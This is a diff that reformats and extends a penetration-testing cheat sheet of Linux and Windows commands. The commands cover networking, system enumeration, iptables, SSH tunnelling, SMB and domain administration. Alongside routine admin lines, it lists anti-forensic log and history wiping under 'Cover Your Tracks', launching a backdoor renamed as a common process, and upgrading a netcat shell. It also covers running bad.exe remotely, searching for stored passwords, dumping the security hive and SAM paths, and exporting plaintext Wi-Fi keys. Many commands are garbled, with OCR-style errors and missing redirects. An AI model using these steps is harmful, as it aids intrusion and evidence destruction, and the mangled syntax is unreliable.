@@ -1,143 +1,148 @@
 ﻿********************  Linux Networking Commands  ************************
-watch ss -tp                                                                        #Network connections
-netstat -ant                                                                        #Tcp connections -anu=udp
-netstat -tulpn                                                                        #Connections with PIDs
-lsof -i                                                                                        #Established connections
-smb:// ip /share                                                                #Access windows smb share
-share user x.x.x.x c$                                                        #Mount Windows share
-smbclient -U user\\\\ ip \\ share                                #SMB connect
-ifconfig eth# ip / cidr                                                        #Set IP and netmask
-ifconfig eth0:l ip / cidr                                                #Set virtual interface
-route add default gw gw ip                                                #Set GW
-ifconfig eth# mtu [size]                                                #Change MTU size
-export MAC=xx: XX: XX: XX: XX: XX                                #Change MAC
-ifconfig int hw ether MAC                                                #Change MAC
-macchanger -m MAC int                                                        #Backtrack MAC changer
-iwlist int scan                                                                        #Built-in wifi scanner
-dig -x ip                                                                                #Domain lookup for IP
-host ip                                                                                        #Domain lookup for IP
-host -t SRV service tcp.url.com                                        #Domain SRV lookup
-dig @ ip domain -t AXrR                                                        #DNS Zone Xfer
-host -1 domain namesvr                                                        #DNS Zone Xfer
-ip xfrm state list                                                                #Print existing VPN keys
-ip addr add ip / cidr aev ethO                                        #Adds 'hidden' interface
-/var/log/messages | grep DHCP                                        #List DHCP assignments
-tcpkill host ip and port port                                        #Block ip:port
-echo "1" /proc/sys/net/ipv4/ip forward                        #Turn on IP Forwarding
-echo "nameserver x.x.x.x" /etc/resolv.conf                #Add DNS Server
-
+watch ss -tp                                                   #Network connections
+netstat -ant                                                   #Tcp connections -anu=udp
+netstat -tulpn                                                 #Connections with PIDs
+lsof -i                                                        #Established connections
+smb:// ip /share                                               #Access windows smb share
+share user x.x.x.x c$                                          #Mount Windows share
+smbclient -U user\\\\ ip \\ share                              #SMB connect
+ifconfig eth# ip / cidr                                        #Set IP and netmask
+ifconfig eth0:l ip / cidr                                      #Set virtual interface
+route add default gw gw ip                                     #Set GW
+ifconfig eth# mtu [size]                                       #Change MTU size
+export MAC=xx: XX: XX: XX: XX: XX                              #Change MAC
+ifconfig int hw ether MAC                                      #Change MAC
+macchanger -m MAC int                                          #Backtrack MAC changer
+iwlist int scan                                                #Built-in wifi scanner
+dig -x ip                                                      #Domain lookup for IP
+host ip                                                        #Domain lookup for IP
+host -t SRV service tcp.url.com                                #Domain SRV lookup
+dig @ ip domain -t AXrR                                        #DNS Zone Xfer
+host -1 domain namesvr                                         #DNS Zone Xfer
+ip xfrm state list                                             #Print existing VPN keys
+ip addr add ip / cidr aev ethO                                 #Adds 'hidden' interface
+/var/log/messages | grep DHCP                                  #List DHCP assignments
+tcpkill host ip and port port                                  #Block ip:port
+echo "1" /proc/sys/net/ipv4/ip forward                         #Turn on IP Forwarding
+echo "nameserver x.x.x.x" /etc/resolv.conf                     #Add DNS Server
+arp -an                                                        #Print route table without dns lookup
+traceroute -n <ip>                                             #Trace route without dns lookup
+netstat -rn                                                    #Prints routing table without dns lookup?????
 
 
 
 ********************  Linux System Info  ************************
 nbtstat -A ip                                                                        #Get hostname for ip
 nbtstat -name                                                                        #Lists local NetBIOS names
-id                                                                                                #Current username
-w                                                                                                #Logged on users
-who -a                                                                                        #User information
-last -a                                                                                        #Last users logged on
-ps -ef                                                                                        #Process listing (top)
-df -h                                                                                        #Disk usage (free)
-uname -a                                                                                #Kernel version/CPU info
-mount                                                                                        #Mounted file Systems
+id                                                                                   #Current username
+w                                                                                    #Logged on users
+who -a                                                                               #User information
+last -a                                                                              #Last users logged on
+ps -ef                                                                               #Process listing (top)
+df -h                                                                                #Disk usage (free)
+uname -a                                                                             #Kernel version/CPU info
+mount                                                                                #Mounted file Systems
 getent passwd                                                                        #Show list of users
-PATH~$PATH:/home/mypath                                                        #Add to PATH variable
-kill pid                                                                                #Kills process with pid
-cat /etc/issue                                                                        #Show OS info
-cat /etc/'release'                                                                #Show OS version info
-cat /proc/version                                                                #Show kernel info
-rpm --query -all                                                                #Installed pkgs (Redhat)
-rpm -ivh ' .rpm                                                                        #Install RPM (-e=remove)
-dpkg -get-selections                                                        #Installed pkgs (Ubuntu)
+PATH~$PATH:/home/mypath                                                              #Add to PATH variable
+kill pid                                                                             #Kills process with pid
+cat /etc/issue                                                                       #Show OS info
+cat /etc/'release'                                                                   #Show OS version info
+cat /proc/version                                                                    #Show kernel info
+rpm --query -all                                                                     #Installed pkgs (Redhat)
+rpm -ivh ' .rpm                                                                      #Install RPM (-e=remove)
+dpkg -get-selections                                                                 #Installed pkgs (Ubuntu)
 dpkg -I '.deb                                                                        #Install DEB (-r=remove)
-pkginfo                                                                                        #Installed pkgs (Solaris)
-which tscsh/csh/ksh/bash                                                #Show location of executable
-chmod -50 tcsh/csh/ksh                                                        #Disable shell , force bash
+pkginfo                                                                              #Installed pkgs (Solaris)
+which tscsh/csh/ksh/bash                                                             #Show location of executable
+chmod -50 tcsh/csh/ksh                                                               #Disable shell , force bash
 
 
 
 
 ********************  Linux Utility Commands  ************************
-wget http:// url -0 url.txt -o /dev/null                #Grab url
-rdesktop ip                                                                                #Remote Desktop to ip
-scp /tmp/file user@x.x.x.x:/tmp/file                        #Put file
-scp user@ remoteip :/tmp/file /tmp/file                        #Get file
-useradd -m user                                                                        #Add user
-passwd user                                                                                #Change user password
-rmuser unarne                                                                        #Remove user
-script -a outfile                                                                #Record shell : Ctrl-D stops
-apropos subject                                                                        #Find related command
-history                                                                                        #View users command history
+wget http:// url -0 url.txt -o /dev/null                                                     #Grab url
+rdesktop -u <username> -p <Password> -d <domain> -f -r clipboard:PRIMARYCLIPBOARD ip         #Remote Desktop to ip
+scp /tmp/file user@x.x.x.x:/tmp/file                                                         #Put file
+scp user@<remoteip>:/tmp/file /tmp/file                                                      #Get file
+useradd -m user                                                                              #Add user
+passwd user                                                                                  #Change user password
+rmuser unarne                                                                                #Remove user
+script -a outfile                                                                            #Record shell : Ctrl-D stops
+apropos subject                                                                              #Find related command
+history                                                                                      #View users command history
 ! num                                                                                        #Executes line # in history
-tar -xvfj file.tar                                                                #Unpack a tar file bzip2(j)
-tar -czvf <file>.tar.gz /original-file                        #Archive a gzip(z) file
-encfs /cryptdir /tmp/cleartext                                        #temporarily unencrypts to /tmp/cleartext                                                                                        #
-
+tar -xvfj file.tar                                                                           #Unpack a tar file bzip2(j)
+tar -czvf <file>.tar.gz /original-file                                                       #Archive a gzip(z) file
+encfs /cryptdir /tmp/cleartext                                                               #Temporarily unencrypts to /tmp/cleartext
+python -c 'import pty;pty.spawn("/bin/bash")'                                                #Upgrades a nc shell to tty
 
 
 
 ********************  Linux File Commands  ************************
-diff filel file2                                                                #Compare files
-rm -rf dir                                                                                #Force delete of dir
-shred -f -u file                                                                #Overwrite/delete file
-touch -r <ref-file> file                                                #Matches ref_ file timestamp
-touch -t YYYYMMDDHHSS file                                                #Set file timestamp
-fdisk -l                                                                                #List connected drives
-mount /dev/sda# /mnt/usbkey                                                #mount USB key
-md5sum -t file                                                                        #Compute md5 hash
-echo -n "str" | md5sum                                                        #Generate md5 hash
-shalsum file                                                                        #SHAl hash of file
-sort -u                                                                                        #Sort/show unique lines
-grep -c ''str'' file                                                        #Count lines w/ ''str''
-tar cf file.tar files                                                        #Create .tar from files
-tar xf file.tar                                                                        #Extract .tar
-tar czf file.tar.gz files                                                #Create .tar.gz
-tar xzf file.tar.gz                                                                #Extract .tar.gz
-tar cjf file.tar.bz2 files                                                #Create .tar.bz2
-tar xjf file.tar.bz2                                                        #Extract .tar.bz2
-gzip file                                                                                #Compress/rename file
-gzip -d file.gz                                                                        #Decompress file.gz
-upx -9 -o out.exe orig.exe                                                #UPX packs orig.exe
-zip -r zipname.zip \Directory\'                                        #Create zip
-dd skip=lOOO count=2000 bs=8 if=file of=file        #Cut block 1K-3K from file
-split -b 9K \ file prefix                                                #Split file into 9K chunks
-awk 'sub("$"."\r")' unix.txt win.txt                        #Win compatible txt file
-find -i -name file -type '.pdf                                        #Find PDF files
-find / -perm -4000 -o -perm -2000 -exec ls -        #Search for setuid files
-ldb {} \;
-dos2unix file                                                                        #Convert to ~nix format
-file file                                                                                #Determine file type/info
-chattr (+/-)i file                                                                #Set/Unset immutable bit
+diff filel file2                                         #Compare files
+rm -rf dir                                               #Force delete of dir
+shred -f -u file                                         #Overwrite/delete file
+touch -r <ref-file> file                                 #Matches ref_ file timestamp
+touch -t YYYYMMDDHHSS file                               #Set file timestamp
+fdisk -l                                                 #List connected drives
+mount /dev/sda# /mnt/usbkey                              #mount USB key
+md5sum -t file                                           #Compute md5 hash
+echo -n "str" | md5sum                                   #Generate md5 hash
+shalsum file                                             #SHAl hash of file
+sort -u                                                  #Sort/show unique lines
+grep -c ''str'' file                                     #Count lines w/ ''str''
+tar cf file.tar files                                    #Create .tar from files
+tar xf file.tar                                          #Extract .tar
+tar czf file.tar.gz files                                #Create .tar.gz
+tar xzf file.tar.gz                                      #Extract .tar.gz
+tar cjf file.tar.bz2 files                               #Create .tar.bz2
+tar xjf file.tar.bz2                                     #Extract .tar.bz2
+gzip file                                                #Compress/rename file
+gzip -d file.gz                                          #Decompress file.gz
+upx -9 -o out.exe orig.exe                               #UPX packs orig.exe
+zip -r zipname.zip \Directory\'                          #Create zip
+dd skip=lOOO count=2000 bs=8 if=file of=file             #Cut block 1K-3K from file
+split -b 9K \ file prefix                                #Split file into 9K chunks
+awk 'sub("$"."\r")' unix.txt win.txt                     #Win compatible txt file
+find -i -name file -type '.pdf                           #Find PDF files
+find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \;    #Search for setuid files
+dos2unix file                                            #Convert to ~nix format
+file file                                                #Determine file type/info
+chattr (+/-)i file                                       #Set/Unset immutable bit
 
 
 
 
 ********************  Linux Misc Commands  ************************
-unset HISTFILE                                                                        #Disable history logging
-ssh user@ ip arecord - | aplay -                                #Record remote mic
-gee -o outfile myfile.c                                                        #Compile C,C++
-init 6                                                                                        #Reboot (0 = shutdown)
+unset HISTFILE                                              #Disable history logging
+ssh user@ ip arecord - | aplay -                            #Record remote mic
+gee -o outfile myfile.c                                     #Compile C,C++
+init 6                                                      #Reboot (0 = shutdown)
 cat /etc/'syslog'.conf 1 grep -v "#"                        #List of log files
-grep 'href=' file | cut -d"/" -f3 | grep                #Strip links in url.com
-url | sort -u
-dd if=/dev/urandom of= file bs=3145728                        #Make random 3MB file
-count=lOO
+grep 'href=' file | cut -d"/" -f3 | grep url | sort -u      #Strip links in url.com
+dd if=/dev/urandom of= file bs=3145728 count=lOO            #Make random 3MB file
 
 
 
 
 ********************  Linux Cover Your Tracks ***********************
-echo "" /var/log/auth.log                                                #Clear auth.log file
-echo '''' ~/.bash_history                                                #Clear current user bash history
-rm ~/.bash history -rf                                                        #Delete .bash_history file
-history -C                                                                                #Clear current session history
-export HISTFILESIZE=O                                                        #Set historj max lines to 0
-export HISTSIZE=O                                                                #Set histroy max commands to 0
-unset HISTFILE                                                                        #Disable history logging (need to logout to take effect)
-kill -9 $$                                                                                #Kills current session
-ln /dev/null -/.bash_history -sf                                #Perrnanentlj send all bash history commands to /dev/null
+echo "" /var/log/auth.log                                 #Clear auth.log file
+echo '''' ~/.bash_history                                 #Clear current user bash history
+rm ~/.bash history -rf                                    #Delete .bash_history file
+history -C                                                #Clear current session history
+export HISTFILESIZE=O                                     #Set historj max lines to 0
+export HISTSIZE=O                                         #Set histroy max commands to 0
+unset HISTFILE                                            #Disable history logging (need to logout to take effect)
+kill -9 $$                                                #Kills current session
+ln /dev/null -/.bash_history -sf                          #Permanently send all bash history commands to /dev/null
+bash -c "exec -a <new name> <backdoor>"                   #starts a back door renaming it to a common process
 
 
+******************** SSH Tricks  *****************************
+cat localfile.txt | ssh user@<ip> " cat > file"                                     #SSH file transfer
+ssh -N -M -S /tmp/sshtgt1 user@1.1.1.1                                              #Creates a Control Socket at /tmp/sshtgt1
+ssh -S /tmp/sshtgt1 -O forward user@1.1.1.1                                         #Creates an interractive session on target using existing sockets.
+/usr/sbin/sshd -D -P 2222 -q -O "AllowTCPForwarding yes" -O "GatewayPorts yes"      #Createsssh server listening on a radom port ready for ssh tunnels 
 
 
 ********************  Linux Scripting  ************************
@@ -207,23 +212,18 @@ fi
 
 ********************  IPTables  ************************
 iptables-restore file                                                                #Restore iptables rules
-iptables -L -v --line-numbers                                                #List all iptables rules with affected and line numbers
-iptables -F                                                                                        #Flush all iptables rules
-iptables -P INPUT/FORWARD/OUTPUT ACCEPT/REJECT/DROP        #Change default policy for rules that don't match rules
-iptables -A INPUT -i interface -m state -state
-RELATED,ESTABLcSHED -j ACCEPT                                                #Allow established connections on INPUT
-iptables -D INPUT 7                                                                        #Delete 7th inbound rule
+iptables -L -v --line-numbers                                                        #List all iptables rules with affected and line numbers
+iptables -F                                                                          #Flush all iptables rules
+iptables -P INPUT/FORWARD/OUTPUT ACCEPT/REJECT/DROP                                  #Change default policy for rules that don't match rules
+iptables -A INPUT -i interface -m state -state RELATED,ESTABLISHED -j ACCEPT         #Allow established connections on INPUT
+iptables -D INPUT 7                                                                  #Delete 7th inbound rule
 iptables -t raw -L -n                                                                #Increase throughput by turning off statefulness
-iptables -P INPUT DROP                                                                #Drop all packets
+iptables -P INPUT DROP                                                               #Drop all packets
 
 
 ### Allow SSH on port 22 outbound
-
-
-iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state
-NEW,ESTABLISHED -j ACCEPT
-iptables -A INPUT -i iface -p tcp --sport 22 -m state --state
-ESTABLISHED -j ACCEPT
+iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
+iptables -A INPUT -i iface -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
 
 
 ###ALLOW ICMP OUTBOUND
@@ -255,22 +255,22 @@ iptables -A LOGGING -j DROP
 
 
 ********************  UPDATE-RC.D ***********************
-service --status-all                                                        #[+] Service starts at boot
-                                                                                                #[-] Service does not start
-service service start                                                        #Start a service
-service service stop                                                        #Stop a service
-service service status                                                        #Check status of a service
-update-rc.d -f service remove                                        #Remove a service start up cmd
-update-rc.d service defaults                                        #Add a start up service
+service --status-all                                           #[+] Service starts at boot
+                                                               #[-] Service does not start
+service service start                                          #Start a service
+service service stop                                           #Stop a service
+service service status                                         #Check status of a service
+update-rc.d -f service remove                                  #Remove a service start up cmd
+update-rc.d service defaults                                   #Add a start up service
 
 
 
 
 ********************  CHKconfig ***********************
-chkconfig --list                                                                #List existing services and run status
-chkconfig service -list                                                        #Check single service status
-chkconfig service on [--level 3]                                #Add service [optional to add level at which service runs)
-chkconfig service off [--level 3]                                #Remove service
+chkconfig --list                                               #List existing services and run status
+chkconfig service -list                                        #Check single service status
+chkconfig service on [--level 3]                               #Add service [optional to add level at which service runs)
+chkconfig service off [--level 3]                              #Remove service
 
 
 
@@ -283,25 +283,24 @@ convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg
 
 
 ###Open X11 stream viewing
-xwd -display 1.1.1.1:0 -root -silent -out x11dump        #Read dumped file with xwudtopnm or GIMP
+xwd -display 1.1.1.1:0 -root -silent -out x11dump             #Read dumped file with xwudtopnm or GIMP
 
 
 
 
 ********************  TCPDump ***********************
-tcpdump -i ethO -XX -w out.pcap                                                                                #CAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE
-tcpdump -i ethO port 80 dst 2.2.2.2                                                                        #CAPTURE HTTP TRAFFIC TO 2 . 2 . 2 . 2
-tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24        #SHOW CONNECTIONS TO A SPECIFIC IP
-tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'                                        #PRINT ALL PING RESPONSES
-tcpdump -i ethO -c 50 -tttt 'udp and port 53'                                                #CAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP
-file2cable -i ethO -f file.pcap                                                                                #Replay Pcap
-tcpreplay --topspeed --loop=O --intf=ethO .pcap_file_to replay
-mbps=l0|100|1000                                                                                                        #Replay packet DOS
+tcpdump -i ethO -XX -w out.pcap                                                     #CAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE
+tcpdump -i ethO port 80 dst 2.2.2.2                                                 #CAPTURE HTTP TRAFFIC TO 2.2.2.2
+tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24                   #SHOW CONNECTIONS TO A SPECIFIC IP
+tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'                                  #PRINT ALL PING RESPONSES
+tcpdump -i ethO -c 50 -tttt 'udp and port 53'                                       #CAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP
+file2cable -i ethO -f file.pcap                                                     #Replay Pcap
+tcpreplay --topspeed --loop=O --intf=ethO .pcap_file_to replay mbps=l0|100|1000     #Replay packet DOS
 
 
 
 
-********************  Native Kali Commands ***********************
+********************  Additional Kali Commands ***********************
 #WMIC EQUIVALENT
 wmis -U DOMAIN\ user % password // DC cmd.exe /c command
 
@@ -309,58 +308,60 @@ wmis -U DOMAIN\ user % password // DC cmd.exe /c command
 ###MOUNT SMB SHARE
 mount.cifs // ip /share /mnt/share -o user= user ,pass= pass ,sec=ntlmssp,domain= domain ,rw        # Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs
 
-
-
+enum4linux <IP>                                                                 #A very detailed remote SMB enumeration 
+/usr/share/doc/python_impacket/exmaples/psexec.py domain/user:'password'@<ip>   #psexec but cleaner
+winexe -u domain.name/username //ip C:\\windows\\bad.exe --system               #Executes Bad.exe on remote windows box.  if no program is listed will default to cmd.exe
 
 ********************  PFSense ***********************
-pfSsh.php                                                                                #pfSense Shell System
+pfSsh.php                                                   #pfSense Shell System
 pfSsh.php playback enableallowallwan                        #Allow all inbound WAN connections (adds to visible rules in WAN rules)
-pfSsh.php playback enablesshd                                        #Enable ssh inbound/outbound
-pfctl -sn                                                                                #Show NAT rules
-pfctl -sr                                                                                #Show filter rules
-pfctl -sa                                                                                #Show all rules
-pfctl -d                                                                                #Disables all rules
-pfctl -e                                                                                #Enables all rules
-viconfig                                                                                #Edit config
-rm /tmp/config.cache                                                        #Remove cached (backup) config after editing the current running
-/etc/rc.reload_all                                                                #Reload entire config
+pfSsh.php playback enablesshd                               #Enable ssh inbound/outbound
+pfctl -sn                                                   #Show NAT rules
+pfctl -sr                                                   #Show filter rules
+pfctl -sa                                                   #Show all rules
+pfctl -d                                                    #Disables all rules
+pfctl -e                                                    #Enables all rules
+viconfig                                                    #Edit config
+rm /tmp/config.cache                                        #Remove cached (backup) config after editing the current running
+/etc/rc.reload_all                                          #Reload entire config
 
 
 
 
 ********************  Windows Versions ***********************
-NT 3.1                                                                                        #Windows NT 3.1 (All)
-NT 3.5                                                                                        #Windows NT 3.5 (All)
-NT 3.51                                                                                        #Windows NT 3.51 (All)
-NT 4.0                                                                                        #Windows NT 4.0 (All)
-NT 5.0                                                                                        #Windows 2000 (All)
-NT 5.1                                                                                        #Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)
-NT 5.2                                                                                        #Windows XP 64-bit, Server 2003 & R2, Windows Home Server
-NT 6.0                                                                                         #Windows Vista, Server 2008
-NT 6.1                                                                                        #Windows 7, Server 2008 R2
-NT 6.2                                                                                        #Windows 8, Windows Server 2012
-
+NT 3.1             #Windows NT 3.1 (All)
+NT 3.5             #Windows NT 3.5 (All)
+NT 3.51            #Windows NT 3.51 (All)
+NT 4.0             #Windows NT 4.0 (All)
+NT 5.0             #Windows 2000 (All)
+NT 5.1             #Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)
+NT 5.2             #Windows XP 64-bit, Server 2003 & R2, Windows Home Server
+NT 6.0             #Windows Vista, Server 2008
+NT 6.1             #Windows 7, Server 2008 R2
+NT 6.2             #Windows 8, Windows Server 2012
+NT 6.3             #Windows 8.1, Windows Server 2012 R2
+NT 10              #Windows 10, Windows Server 2016
 
 
 
 ********************  Windows Files ***********************
-%SYSTEMROOT%                                                                                #Typically C:\Windows
-%SYSTEMROOT%\System32\drivers\etc\hosts                                #DNS entries
-%SYSTEMROOT%\System32\drivers\etc\networks                        #Network settings
-%SYSTEMROOT%\system32\config\SAM                                        #User & password hashes
-%SYSTEMROOT%\repair\SAM                                                                #Backup copy of SAM
-%SYSTEMROOT%\System32\config\RegBack\SAM                        #Backup copy of SAM
-%WINDIR%\system32\config\AppEvent.Evt                                #Application Log
-%WINDIR%\system32\config\SecEvent.Evt                                #Security Log
-%ALLUSERSPROFILE%\Start Menu\Programs\Startup\                #Startup Location
-%USERPROFILE%\Start Menu\Programs\Startup\                        #Startup Location
-%SYSTEMROOT%\Prefetch                                                                #Prefetch dir (EXE logs)
-C:\windows\system32\drivers\etc\hosts                                #checks here before a dns request is sent
+%SYSTEMROOT%                                             #Typically C:\Windows
+%SYSTEMROOT%\System32\drivers\etc\hosts                  #DNS entries
+%SYSTEMROOT%\System32\drivers\etc\networks               #Network settings
+%SYSTEMROOT%\system32\config\SAM                         #User & password hashes
+%SYSTEMROOT%\repair\SAM                                  #Backup copy of SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM                 #Backup copy of SAM
+%WINDIR%\system32\config\AppEvent.Evt                    #Application Log
+%WINDIR%\system32\config\SecEvent.Evt                    #Security Log
+%ALLUSERSPROFILE%\Start Menu\Programs\Startup\           #Startup Location
+%USERPROFILE%\Start Menu\Programs\Startup\               #Startup Location
+%SYSTEMROOT%\Prefetch                                    #Prefetch dir (EXE logs)
+C:\windows\system32\drivers\etc\hosts                    #Checks here before a dns request is sent
 
 
 ********************  Startup Directory ***********************
 ###Windows NT 6.1,6.0
-%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup                                                        # All users
+%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup                             # All users
 %SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup        # Specific users
 
 
@@ -371,107 +372,117 @@ C:\windows\system32\drivers\etc\hosts                                #checks her
 
 
 ********************  Windows System Info Commands ***********************
-version                                                                                                        #Get OS version
-sc query state=all                                                                                #Show services
-tasklist /svc                                                                                        #Show processes & services
-tasklist /m                                                                                                #Show all processes & DLLs
-tasklist /S ip /v                                                                                #Remote process listing
-taskkill /PID <pid> /F                                                                        #Force process to terminate
-systeminfo /S ip /U domain\user /P Pwd                                        #Remote system info
-reg query\\ ip \ RegDomain \ Key /v Value                                #Query remote registry, /s=all values
-reg query HKLM /f password /t REG_SZ /s                                        #Search registry for password
-fsutil fsinfo drives                                                                        #List drives •must be admin
-dir /a /s /b c:\'.pdf'                                                                        #Search for all PDFs
-dir /a /b c:\windows\kb'                                                                #Search for patches
-findstr /si password' .txt | '.xml |.xls                                #Search files for password
-tree /F /A c:\ tree.txt                                                                        #Directory listing of C:
-reg save HKLM\Security security.hive                                        #Save security hive to file
-echo %USERNAME%                                                                                        #Current user
-type <file>                                                                                                #View contents of a file
-Get-WindowsDriver -Online -ALL                                                        #List all loaded drivers
-Get-ChildItem | Select-Object name,CreationTime,LastAccessTime,LastWriteTime        #lists mac timestamp
-
+version                                                                            #Get OS version
+systeminfo                                                                         #enumerates basic system info
+sc query state=all                                                                 #Show services
+tasklist /svc                                                                      #Show processes & services
+tasklist /m                                                                        #Show all processes & DLLs
+tasklist /S ip /v                                                                  #Remote process listing
+taskkill /PID <pid> /F                                                             #Force process to terminate
+systeminfo /S ip /U domain\user /P Pwd                                             #Remote system info
+reg query\\ ip \ RegDomain \ Key /v Value                                          #Query remote registry, /s=all values
+reg query HKLM /f password /t REG_SZ /s                                            #Search registry for password
+fsutil fsinfo drives                                                               #List drives •must be admin
+dir /a /s /b c:\'.pdf'                                                             #Search for all PDFs
+dir /a /b c:\windows\kb'                                                           #Search for patches
+findstr /si password' .txt | '.xml |.xls                                           #Search files for password
+tree /F /A c:\ tree.txt                                                            #Directory listing of C:
+reg save HKLM\Security security.hive                                               #Save security hive to file
+echo %USERNAME%                                                                    #Current user
+type <file>                                                                        #View contents of a file
+Get-WindowsDriver -Online -ALL                                                     #List all loaded drivers
+Get-ChildItem | Select-Object name,CreationTime,LastAccessTime,LastWriteTime       #lists mac timestamp
+wmic process get commandline,processid, parentprocessid /format:list               #lists process name, pid and ppid
 
 
 
 
 
 ********************  Windows Net/Domain Commands ***********************
-net view /domain                                                                                #Hosts in current domain
-net view /domain: [MYDOMAIN]                                                        #Hosts in [MYDOMAIN]
-net user /domain                                                                                #All users in current domain
-net user user pass /add                                                                        #Add user
-net localgroup "Administrators" user /add                                #Add user to Administrators
-net accounts /domain                                                                        #Domain password policy
-net localgroup "Administrators"                                                        #List local Admins
-net group /domain                                                                                #List domain groups
-net group "Domain Admins" /domain                                                #List users in Domain Admins
-net group "Domain Controllers" /domain                                        #List DCs for current domain
-net share                                                                                                #Current SMB shares
-net session / find / "\\"                                                                #Active SHB sessions
-net user user /ACTIVE:yes /domain                                                #Unlock domain user account
-net user user " newpassword " /domain                                        #Change domain user password
-net share share c:\share /GRANT:Everyone,FULL                        #Share folder
-net start telnet                                                                                #Starts telnet, however the service must first be enabled
+net view /domain                                                #Hosts in current domain
+net view /domain: [MYDOMAIN]                                    #Hosts in [MYDOMAIN]
+net user /domain                                                #All users in current domain
+net user user pass /add                                         #Add user
+net localgroup "Administrators" user /add                       #Add user to Administrators
+net accounts /domain                                            #Domain password policy
+net localgroup "Administrators"                                 #List local Admins
+net group /domain                                               #List domain groups
+net group "Domain Admins" /domain                               #List users in Domain Admins
+net group "Domain Controllers" /domain                          #List DCs for current domain
+net share                                                       #Current SMB shares
+net session / find / "\\"                                       #Active SHB sessions
+net user user /ACTIVE:yes /domain                               #Unlock domain user account
+net user user " newpassword " /domain                           #Change domain user password
+net share share c:\share /GRANT:Everyone,FULL                   #Share folder
+net start telnet                                                #Starts telnet, however the service must first be enabled
 
 
 ********************  Windows Remote Commands ***********************
-tasklist /S ip /v                                                                                                                #Remote process listing
-systeminfo /S ip /U domain\user /P Pwd                                                                        #Remote systeminfo
-net share \\ ip                                                                                                                        #Shares of remote computer
-net use \\ ip                                                                                                                        #Remote filesystem (IPC$)
-net use z: \\ ip \share password /user: DOMAIN\ user                                        #Map drive, specified credentials
-reg add \\ ip \ regkey \ value                                                                                        #Add registry key remotely
-sc \\ ip create service        binpath=C:\Windows\System32\x.exe start= auto        #Create a remote service (space after start=)
-xcopy /s \\ ip \dir C:\local                                                                                        #Copy remote folder
-shutdown /m \\ ip /r /t 0 /f                                                                                        #Remotely reboot machine
+tasklist /S ip /v                                                                    #Remote process listing
+systeminfo /S ip /U domain\user /P Pwd                                               #Remote systeminfo
+net share \\ ip                                                                      #Shares of remote computer
+net use \\ ip                                                                        #Remote filesystem (IPC$)
+net use z: \\ ip \share password /user: DOMAIN\ user                                 #Map drive, specified credentials
+reg add \\ ip \ regkey \ value                                                       #Add registry key remotely
+sc \\ ip create service        binpath=C:\Windows\System32\x.exe start= auto         #Create a remote service (space after start=)
+xcopy /s \\ ip \dir C:\local                                                         #Copy remote folder
+shutdown /m \\ ip /r /t 0 /f                                                         #Remotely reboot machine
 
 
 
 
 ********************  Windows Network Commands ***********************
-ipconfig / all                                                                                                #IP configuration
-ipconfig /displaydns                                                                                #Local DNS cache
-netstat -ano                                                                                                #Open connections
-netstat -anop tcp 1                                                                                        #Netstat loop
-netstat -an | findstr LISTENING                                                                #LISTENING ports
-route print                                                                                                        #Routing table
-ipconfig /displaydns                                                                                #dns cashe
-arp -a                                                                                                                #Known MACs (ARP table)
-nslookup, set type=any, ls -d domain results.txt, exit                #DNS Zone Xfer
-nslookup -type=SRV _www._tcp.url.com                                                #Domain SRV lookup ( ldap, kerberos, sip)
-tftp -I ip GET remotefile                                                                        #TFTP file transfer
-netsh wlan show profiles                                                                        #Saved wireless profiles
-netsh firewall set opmode disable                                                        #Disable firewall ('Old)
-netsh wlan export profile folder=. key=clear                                #Export wifi plaintext pwd
-netsh interface ip show interfaces                                                        #List interface IDs/MTUs
-netsh interface ip set address local static ip nmask gw ID        #Set IP
-netsh interface ip set dns local static ip                                        #Set DNS server
-netsh interface ip set address local dhcp                                        #Set interface to use DHCP
+ipconfig / all                                                       #IP configuration
+ipconfig /displaydns                                                 #Local DNS cache
+netstat -ano                                                         #Open connections
+netstat -anop tcp 1                                                  #Netstat loop
+netstat -an | findstr LISTENING                                      #LISTENING ports
+route print                                                          #Routing table
+ipconfig /displaydns                                                 #dns cashe
+arp -a                                                               #Known MACs (ARP table)
+nslookup, set type=any, ls -d domain results.txt, exit               #DNS Zone Xfer
+nslookup -type=SRV _www._tcp.url.com                                 #Domain SRV lookup ( ldap, kerberos, sip)
+tftp -I ip GET remotefile                                            #TFTP file transfer
+netsh wlan show profiles                                             #Saved wireless profiles
+netsh firewall set opmode disable                                    #Disable firewall ('Old)
+netsh wlan export profile folder=. key=clear                         #Export wifi plaintext pwd
+netsh interface ip show interfaces                                   #List interface IDs/MTUs
+netsh interface ip set address local static ip nmask gw ID           #Set IP
+netsh interface ip set dns local static ip                           #Set DNS server
+netsh interface ip set address local dhcp                            #Set interface to use DHCP
 
 
 
 
 ********************  Windows Utility Commands ***********************
-type file                                                                                                                #Display file contents
-del path\' .' /a /s /q /f                                                                                #Forceably delete all files in path
-find /I "str" filename                                                                                        #Find "str"
-command | find /c /v ""                                                                                        #Line count of cmd output
-at HH:Ml1 file [args] (i.e. at 14:45 cmd /c)                                        #Schedule file to run
-runas /user: user " file [args] "                                                                #Run file as user
-restart /r /t 0                                                                                                        #Restart now
-tr -d '\15\32' win.txt unix.txt                                                                        #Removes CR & 'Z ('nix)
-makecab file                                                                                                        #Native compression
-Wusa.exe /uninstall /kb: ###                                                                        #Uninstall patch
-cmd.exe "wevtutil qe Application /c:40 /f:text /rd:true"                #CLI Event Viewer
-lusrrngr.rnsc                                                                                                        #Local user manager
